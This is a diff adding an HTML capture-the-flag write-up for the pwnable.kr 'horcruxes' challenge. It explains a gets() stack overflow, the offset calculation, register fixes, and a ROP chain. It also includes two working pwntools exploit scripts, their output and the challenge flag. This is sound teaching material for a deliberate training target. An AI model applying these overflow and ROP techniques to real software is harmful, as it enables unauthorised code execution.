@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="description" content="Detailed pwnable.kr horcruxes challenge writeup, covering ROP chains, buffer overflow exploitation, seccomp bypass, and EBX register manipulation for flag reading.">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>pwnable.kr: horcruxes Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="canonical" href="https://yaelshechter.com/pwnable-horcruxes.html" />
+
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "TechArticle",
+            "headline": "pwnable.kr horcruxes Writeup - ROP Chains and Seccomp Bypass",
+            "author": {
+                "@type": "Person",
+                "name": "Yael Shechter",
+                "url": "https://yaelshechter.github.io/"
+            },
+            "datePublished": "2026-02-14",
+            "dateModified": "2026-02-14",
+            "keywords": ["pwnable.kr", "ROP", "buffer overflow", "seccomp", "return-oriented programming"],
+            "url": "https://yaelshechter.com/pwnable-horcruxes.html"
+        }
+    </script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>
+        hljs.highlightAll();
+    </script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: #fafafa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+
+        .meme-image {
+            width: 100%;
+            max-width: 100%;
+            display: block;
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        header {
+            margin-bottom: 64px;
+            padding-bottom: 32px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .back-link {
+            color: #4299e1;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            transition: color 0.2s;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+
+        .back-link::before {
+            content: '← ';
+        }
+
+        .back-link:hover {
+            color: #2b6cb0;
+        }
+
+        h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a202c;
+            letter-spacing: -0.02em;
+        }
+
+        /* CSS for the Copy Button */
+        pre {
+            position: relative;
+            background: #1a202c;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+            overflow-x: auto;
+            border: 1px solid #2d3748;
+            max-width: 100%;
+        }
+
+        .copy-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 4px 8px;
+            background: #2d3748;
+            color: #e2e8f0;
+            border: 1px solid #4a5568;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 12px;
+            font-family: 'DM Sans', sans-serif;
+            transition: all 0.2s;
+            opacity: 0;
+        }
+
+        pre:hover .copy-button {
+            opacity: 1;
+        }
+
+        .copy-button:hover {
+            background: #4a5568;
+            color: white;
+        }
+
+        .copy-button.copied {
+            background: #48bb78;
+            border-color: #48bb78;
+            color: white;
+        }
+
+
+        .meta {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+
+        .meta span {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .tags {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 16px;
+        }
+
+        .tag {
+            font-size: 12px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            background: #edf2f7;
+            color: #4a5568;
+            font-family: 'Fira Code', monospace;
+        }
+
+        .banner {
+            width: 100%;
+            max-width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 16px;
+            margin: 16px 0 24px;
+        }
+
+        article {
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            width: 100%;
+        }
+
+        article h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-top: 40px;
+            margin-bottom: 16px;
+        }
+
+        article h2:first-child {
+            margin-top: 0;
+        }
+
+        article h3 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 32px;
+            margin-bottom: 12px;
+        }
+
+        article p {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 16px;
+            color: #2d3748;
+        }
+
+        article ul,
+        article ol {
+            margin-left: 24px;
+            margin-bottom: 16px;
+        }
+
+        article li {
+            font-size: 16px;
+            line-height: 1.7;
+            margin-bottom: 8px;
+        }
+
+        article a {
+            color: #4299e1;
+            text-decoration: none;
+        }
+
+        article a:hover {
+            text-decoration: underline;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            font-size: 14px;
+            background: #f7fafc;
+            padding: 2px 6px;
+            border-radius: 3px;
+            color: #2d3748;
+        }
+
+        pre code {
+            background: none;
+            padding: 0;
+            color: #e2e8f0;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .hljs {
+            background: transparent;
+            color: #e2e8f0;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 32px 0;
+        }
+
+        .figure-image {
+            width: 100%;
+            max-width: 600px;
+            display: block;
+            margin: 24px auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            font-size: 15px;
+        }
+
+        table th,
+        table td {
+            padding: 10px 16px;
+            text-align: left;
+            border: 1px solid #e2e8f0;
+        }
+
+        table th {
+            background: #f7fafc;
+            font-weight: 600;
+            color: #1a202c;
+        }
+
+        table td code {
+            font-size: 13px;
+        }
+
+        .cat-button {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: white;
+            border: 2px solid #2d3748;
+            cursor: pointer;
+            font-size: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s ease;
+            z-index: 1000;
+        }
+
+        .cat-button:hover {
+            transform: scale(1.1);
+            box-shadow: 4px 4px 0 #2d3748;
+        }
+
+        .cat-button:active {
+            transform: scale(0.95);
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 28px;
+            }
+
+            article {
+                padding: 24px;
+            }
+
+            pre {
+                padding: 16px;
+            }
+        }
+    </style>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-88239B8JH3"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+
+        gtag('config', 'G-88239B8JH3');
+    </script>
+</head>
+
+<body>
+
+<div class="container">
+    <header>
+        <a href="index.html" class="back-link">Back to writeups</a>
+        <h1>pwnable.kr: horcruxes writeup</h1>
+        <div class="meta">
+            <span>📅 Feb 2026</span>
+            <span>🏆 7 points</span>
+            <span>📂 Toddler's Bottle</span>
+        </div>
+        <div class="tags">
+            <span class="tag">ROP</span>
+            <span class="tag">buffer overflow</span>
+            <span class="tag">seccomp</span>
+            <span class="tag">i386</span>
+        </div>
+    </header>
+
+    <article>
+
+        <img src="images/pwnable-banner.png" alt="banner" class="banner" />
+
+        <h2>Challenge Description</h2>
+        <p>We get the following hint:</p>
+
+        <pre><code>Voldemort concealed his splitted soul inside 7 horcruxes.
+Find all horcruxes, and ROP it!
+author: jiwon choi
+
+ssh horcruxes@pwnable.kr -p2222 (pw:guest)</code></pre>
+
+        <p>Fun fact: even after finishing this challenge, I still can't pronounce "horcruxes" correctly. </p>
+
+        <p>Let's connect:</p>
+        <pre><code>ssh horcruxes@pwnable.kr -p2222</code></pre>
+
+        <p>In the home directory we see:</p>
+        <pre><code>horcruxes  readme</code></pre>
+
+        <pre><code>horcruxes@ubuntu:~$ cat readme
+connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
+rop it to read the flag.</code></pre>
+
+        <p>Running <code>checksec</code>:</p>
+
+        <pre><code>checksec --file=/home/horcruxes/horcruxes
+[*] '/home/horcruxes/horcruxes'
+    Arch:       i386-32-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8040000)
+    Stripped:   No</code></pre>
+
+        <p>No PIE and no stack canary, which is good for ROP.</p>
+
+        <hr />
+
+        <h2>Reverse Engineering</h2>
+
+        <p>The binary doesn't come with source code, so I decompiled it. The main function sets up a seccomp sandbox and calls <code>ropme()</code>:</p>
+
+        <pre><code class="language-c">int main(int argc, char *argv[]) {
+    setvbuf(stdout, NULL, _IOLBF, 0);
+    setvbuf(stdin, NULL, _IOLBF, 0);
+    alarm(60);
+    hint();
+    init_ABCDEFG();
+
+    // seccomp setup only allow: open, read, write, mprotect, exit_group, readlink
+    seccomp_ctx = seccomp_init(SCMP_ACT_KILL);
+    seccomp_rule_add(seccomp_ctx, SCMP_ACT_ALLOW, 0x5, 0);    // open
+    seccomp_rule_add(seccomp_ctx, SCMP_ACT_ALLOW, 0x3, 0);    // read
+    seccomp_rule_add(seccomp_ctx, SCMP_ACT_ALLOW, 0x4, 0);    // write
+    seccomp_rule_add(seccomp_ctx, SCMP_ACT_ALLOW, 0xfc, 0);   // exit_group
+    seccomp_load(seccomp_ctx);
+
+    ropme();
+    return 0;
+}</code></pre>
+
+        <p>Note that the seccomp filter means <code>execve</code> is blocked, so we can't just spawn a shell. We can only use open/read/write.</p>
+
+        <p>The <code>ropme()</code> function is vulnerable:</p>
+
+        <pre><code class="language-c">void ropme(void) {
+    char buf[100];
+    int input_char;
+    int fd;
+
+    printf("Select Menu:");
+    scanf("%d", &amp;input_char);
+    getchar();
+
+    if (input_char == a)      { A(); }
+    else if (input_char == b) { B(); }
+    else if (input_char == c) { C(); }
+    else if (input_char == d) { D(); }
+    else if (input_char == e) { E(); }
+    else if (input_char == f) { F(); }
+    else if (input_char == g) { G(); }
+    else {
+        printf("How many EXP did you earned? : ");
+        gets(buf);
+        if (atoi(buf) == sum) {
+            fd = open("/home/horcruxes_pwn/flag", 0);
+            read(fd, buf, 100);
+            puts(buf);
+            close(fd);
+            exit(0);
+        }
+        puts("You'd better get more experience to kill Voldemort");
+    }
+    return;
+}</code></pre>
+
+        <p>Note:</p>
+        <ol>
+            <li><strong>Overflow</strong>: <code>gets(buf)</code> on a 100-byte buffer with no bounds checking. There is no stack canary, so we can overflow the return address.</li>
+            <li><strong>Flag-reading code</strong>: If <code>atoi(buf) == sum</code>, the program opens and reads <code>/home/horcruxes_pwn/flag</code>. The <code>sum</code> variable is the sum of all seven random values assigned to the horcrux functions A through G.</li>
+        </ol>
+
+        <h3>How the Random Values Work</h3>
+
+        <p>The <code>init_ABCDEFG()</code> function generates seven random values at startup using <code>/dev/urandom</code> as a seed:</p>
+
+        <pre><code class="language-c">void init_ABCDEFG() {
+    int fd;
+    unsigned int seed;
+
+    fd = open("/dev/urandom", 0);
+    read(fd, &amp;seed, 4);
+    close(fd);
+    srand(seed);
+
+    // generate random values for each horcrux
+    value_A = rand() * 0xdeadbeef;
+    // ... same for B through G
+
+    sum = value_A + value_B + value_C + value_D + value_E + value_F + value_G;
+}</code></pre>
+
+        <p>Each horcrux function (A through G) prints its value and returns:</p>
+
+        <pre><code class="language-c">void A() {
+    printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", value_A);
+    return;
+}</code></pre>
+
+        <p>The values are randomized on each run and are not predictable in advance. </p>
+
+        <hr />
+
+        <h2>Finding the Overflow Offset</h2>
+
+        <p>I sent a two concatenated cyclic patterns to the <code>gets()</code> call (one cyclic wasn't long enough to reach the return address):</p>
+
+        <pre><code>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaaaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</code></pre>
+
+        <p>The crash landed on:</p>
+
+        <pre><code>Invalid address 0x67616161
+EIP  0x67616161 ('aaag')</code></pre>
+
+        <p><code>aaag</code> is in the second copy of the cyclic pattern, which gives an offset of 121 bytes to the return address.</p>
+
+        <p>Now I just need to find where to jump. </p>
+
+        <hr />
+
+        <h2>Solution 1: Skip the Check</h2>
+
+        <p>The first approach is to skip the <code>sum</code> comparison and jump directly to the flag-reading code at <code>0x08041625</code>:</p>
+
+        <pre><code class="language-x86asm">0x08041621 &lt;+278&gt;:   cmp    eax, edx           ; compare atoi(buf) with sum
+0x08041623 &lt;+280&gt;:   jne    0x804167c          ; jump if not equal
+0x08041625 &lt;+282&gt;:   sub    esp, 0x8           ; ← jump here to skip the check
+0x08041628 &lt;+285&gt;:   push   0x0
+0x0804162a &lt;+287&gt;:   lea    eax, [ebx-0x1e1c]  ; flag path
+0x08041630 &lt;+293&gt;:   push   eax
+0x08041631 &lt;+294&gt;:   call   0x80410f0 &lt;open@plt&gt;
+...</code></pre>
+
+        <p>Since PIE is disabled, the address of this code is fixed.
+            I tried jumping to <code>0x08041625</code> (right after the <code>cmp</code>) with 121 bytes of padding:</p>
+
+        <pre><code>[121 bytes padding] [return address]</code></pre>
+
+        <p>It crashed because my cyclic pattern overwrote the flag path calculation. Looking at the registers, I noticed that <code>ebx</code> contained <code>aabe</code>, which pointed to the offset where <code>ebx</code> gets restored from the stack. Since <code>ebx</code> is used as the base register for position-independent references in the binary, including the flag path, it needs to be set to the correct value for the exploit to work.</p>
+
+        <p>To find the actual address of the flag string: </p>
+        <pre><code>find 0x8040000, 0x8045000, "/home/horcruxes_pwn/flag"
+&gt; 0x8042174</code></pre>
+
+        <p>But the code computes the flag location relative to <code>ebx</code>:</p>
+
+        <pre><code class="language-x86asm">0x0804162a &lt;+287&gt;: lea eax, [ebx - 0x1e1c] ; "/home/horcruxes_pwn/flag"</code></pre>
+
+        <p>So I need <code>ebx = 0x8043f90</code>, which gives <code>0x8043f90 - 0x1e1c = 0x8042174</code>. Confirming in GDB:</p>
+
+        <pre><code>pwndbg&gt; x/s 0x8043f90-0x1e1c
+0x8042174:      "/home/horcruxes_pwn/flag"</code></pre>
+
+        <p>Now I sent this payload:</p>
+
+        <pre><code>[113 bytes padding] [saved ebx (0x8043f90)] [4-bytes padding] [return address]</code></pre>
+
+        <p>After the file is opened, the code reads its contents into a buffer at <code>[ebp-0x74]</code>. I accidentally overwrote <code>ebp</code> with my padding too, so I need to point it somewhere writable and large enough for the buffer.</p>
+
+        <p>Can't use the stack because of ASLR, but <code>vmmap</code> shows a writable section at a fixed address:</p>
+
+        <pre><code>0x8044000 0x8045000 rw-p 1000 3000 horcruxes</code></pre>
+
+        <p>Setting <code>ebp</code> to <code>0x8044200</code> puts the buffer (<code>ebp-0x74 = 0x804418c</code>) inside this region.</p>
+
+        <p>This is how the overflow would look like:</p>
+
+        <pre><code>[112 bytes padding] [saved ebx (0x8043f90)] [saved ebp (0x8044200)] [return address]</code></pre>
+
+        <p>Note: in the final payload the padding is <strong>112</strong> (not 113). In my earlier attempts I was also overwriting the "menu choice" value that gets read before <code>gets()</code>. In the final exploit I just send the menu number separately, so I don't need that extra byte.</p>
+
+        <p>The final exploit is:</p>
+
+        <pre><code class="language-python">from pwn import *
+
+payload = cyclic(112)
+payload += p32(0x8043f90)   # ebx → GOT base for flag path calculation
+payload += p32(0x8044200)   # ebp → writable memory for read buffer
+payload += p32(0x08041625)  # ret → skip the check, jump to open
+
+r = remote('localhost', 9032)
+r.recvuntil(b'Menu:')
+r.sendline(b'5')            # pick an invalid option to reach gets()
+r.recvuntil(b'EXP')
+
+r.sendline(payload)
+r.interactive()</code></pre>
+
+        <p>Running it:</p>
+
+        <pre><code>[+] Opening connection to localhost on port 9032: Done
+[*] Switching to interactive mode
+ did you earned? : You'd better get more experience to kill Voldemort
+The_M4gic_sp3l1_is_Avada_Ked4vra</code></pre>
+
+        <p>Yippy :) </p>
+
+        <hr />
+
+        <h2>Solution 2: Call All Horcruxes and Calculate the Sum</h2>
+
+        <p>I also wanted to solve it as "intended", by calling the "gadgets" A through G using ROP. I would collect their printed values, then jump back to <code>ropme()</code> and give the correct sum.</p>
+
+        <p>Each function is at a known address:</p>
+
+        <table>
+            <tr>
+                <th>Function</th>
+                <th>Address</th>
+            </tr>
+            <tr>
+                <td>A</td>
+                <td><code>0x0804129d</code></td>
+            </tr>
+            <tr>
+                <td>B</td>
+                <td><code>0x080412cf</code></td>
+            </tr>
+            <tr>
+                <td>C</td>
+                <td><code>0x08041301</code></td>
+            </tr>
+            <tr>
+                <td>D</td>
+                <td><code>0x08041333</code></td>
+            </tr>
+            <tr>
+                <td>E</td>
+                <td><code>0x08041365</code></td>
+            </tr>
+            <tr>
+                <td>F</td>
+                <td><code>0x08041397</code></td>
+            </tr>
+            <tr>
+                <td>G</td>
+                <td><code>0x080413c9</code></td>
+            </tr>
+        </table>
+
+        <p>Each function has a return statement, so I can build a ROP chain that calls all functions one by one.
+            This ROP chain calls all seven, then returns to <code>ropme</code> (<code>0x0804150b</code>) to give us another chance to input the sum:</p>
+
+        <pre><code class="language-python">from pwn import *
+
+payload = cyclic(120)
+payload += p32(0x0804129d)  # A()
+payload += p32(0x080412cf)  # B()
+payload += p32(0x08041301)  # C()
+payload += p32(0x08041333)  # D()
+payload += p32(0x08041365)  # E()
+payload += p32(0x08041397)  # F()
+payload += p32(0x080413c9)  # G()
+payload += p32(0x0804150b)  # ropme() - back to the menu
+
+r = remote('localhost', 9032)
+r.recvuntil(b'Menu:')
+r.sendline(b'5')
+r.recvuntil(b'EXP')
+
+r.sendline(payload)
+r.interactive()</code></pre>
+
+        <p>All seven horcruxes print their values, then <code>ropme()</code> runs again. I select option 1 (which goes to the <code>else</code> branch), enter the sum and the program opens and prints the flag:</p>
+
+        <pre><code>[+] Opening connection to localhost on port 9032: Done
+[*] Switching to interactive mode
+ did you earned? : You'd better get more experience to kill Voldemort
+You found "Tom Riddle's Diary" (EXP +243946139)
+You found "Marvolo Gaunt's Ring" (EXP +180857841)
+You found "Helga Hufflepuff's Cup" (EXP +-1573891803)
+You found "Salazar Slytherin's Locket" (EXP +1804907948)
+You found "Rowena Ravenclaw's Diadem" (EXP +911663942)
+You found "Nagini the Snake" (EXP +1321144592)
+You found "Harry Potter" (EXP +-1268347992)
+Select Menu:$ 1
+How many EXP did you earned? : $ 1620280667
+The_M4gic_sp3l1_is_Avada_Ked4vra</code></pre>
+
+        <p>Yippy 2 :) </p>
+
+    </article>
+</div>
+
+<script>
+    document.querySelectorAll('pre').forEach((codeBlock) => {
+        // Create the button
+        const button = document.createElement('button');
+        button.className = 'copy-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        // Append button to the pre element
+        codeBlock.appendChild(button);
+
+        button.addEventListener('click', () => {
+            // Get the text from the <code> tag inside the <pre>
+            const code = codeBlock.querySelector('code').innerText;
+
+            navigator.clipboard.writeText(code).then(() => {
+                button.innerText = 'Copied!';
+                button.classList.add('copied');
+
+                setTimeout(() => {
+                    button.innerText = 'Copy';
+                    button.classList.remove('copied');
+                }, 2000);
+            });
+        });
+    });
+</script>
+
+</body>
+</html>
